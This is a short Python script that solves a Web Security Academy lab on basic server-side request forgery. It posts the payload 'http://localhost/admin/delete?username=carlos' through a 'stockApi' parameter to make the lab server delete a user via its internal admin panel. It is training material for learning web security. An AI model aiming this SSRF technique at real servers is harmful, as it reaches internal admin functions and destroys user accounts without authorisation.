#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 18/10/2023
#
# Lab: Basic SSRF against the local server
#
# Steps: 1. Inject payload into 'stockApi' parameter to delete carlos using SSRF
#           against the local server
#        2. Check that carlos doesn't exist anymore in the admin panel
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
url = "https://0a6f006c034e70848368508e00cf002c.web-security-academy.net"

print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "stockApi")

# payload to delete carlos using SSRF against the local server
payload = "http://localhost/admin/delete?username=carlos"

# data to send via POST
data =  {
    "stockApi": payload
}

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{url}/product/stock", data)

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯ Injecting payload to delete carlos using SSRF against the local server.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")


